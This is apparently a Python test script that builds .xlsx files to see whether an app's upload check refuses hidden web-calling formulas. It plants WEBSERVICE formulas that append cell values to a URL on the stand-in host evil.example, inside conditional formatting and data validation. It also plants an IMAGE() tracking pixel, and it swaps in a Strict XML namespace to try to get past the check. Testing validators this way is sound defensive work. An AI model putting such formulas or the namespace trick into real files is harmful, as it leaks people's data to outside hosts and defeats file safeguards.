"""Where else a formula can live in an .xlsx the workshop check keeps (sheet at its usual path)."""

from __future__ import annotations

import io
import zipfile

from openpyxl import Workbook
from openpyxl.formatting.rule import FormulaRule
from openpyxl.worksheet.datavalidation import DataValidation

from app.products import checks


def verdict(data: bytes) -> str:
    try:
        checks.check("budget.xlsx", data)
    except checks.Refused as exc:
        return f"REFUSED: {exc}"
    return "KEPT"


def saved(book: Workbook) -> bytes:
    out = io.BytesIO()
    book.save(out)
    return out.getvalue()


# 1. conditional formatting formula (evaluated whenever the sheet is drawn)
book = Workbook()
ws = book.active
ws["A1"] = 5
ws.conditional_formatting.add(
    "A1", FormulaRule(formula=['ISNUMBER(WEBSERVICE("https://evil.example/?v="&A1))'], fill=None)
)
print("conditional formatting WEBSERVICE :", verdict(saved(book)))

# 2. data validation formula
book = Workbook()
ws = book.active
dv = DataValidation(type="custom", formula1='ISNUMBER(WEBSERVICE("https://evil.example/?v="&A1))')
dv.add("A1")
ws.add_data_validation(dv)
print("data validation WEBSERVICE        :", verdict(saved(book)))

# 3. IMAGE(), Excel 365's function that fetches a picture from a web address when calculated
book = Workbook()
ws = book.active
ws["A1"] = '=_xlfn.IMAGE("https://evil.example/pixel.png?id=buyer")'
print("cell formula _xlfn.IMAGE(url)     :", verdict(saved(book)))

# 4. the same WEBSERVICE cell formula in an ISO/IEC 29500 Strict workbook (Excel opens Strict .xlsx files)
book = Workbook()
ws = book.active
ws["A1"] = '=WEBSERVICE("https://evil.example/")'
data = saved(book)
with zipfile.ZipFile(io.BytesIO(data)) as archive:
    parts = {n: archive.read(n) for n in archive.namelist()}
parts["xl/worksheets/sheet1.xml"] = parts["xl/worksheets/sheet1.xml"].replace(
    b"http://schemas.openxmlformats.org/spreadsheetml/2006/main", b"http://purl.oclc.org/ooxml/spreadsheetml/main"
)
out = io.BytesIO()
with zipfile.ZipFile(out, "w") as archive:
    for n, d in parts.items():
        archive.writestr(n, d)
print("Strict-namespace sheet WEBSERVICE :", verdict(out.getvalue()))
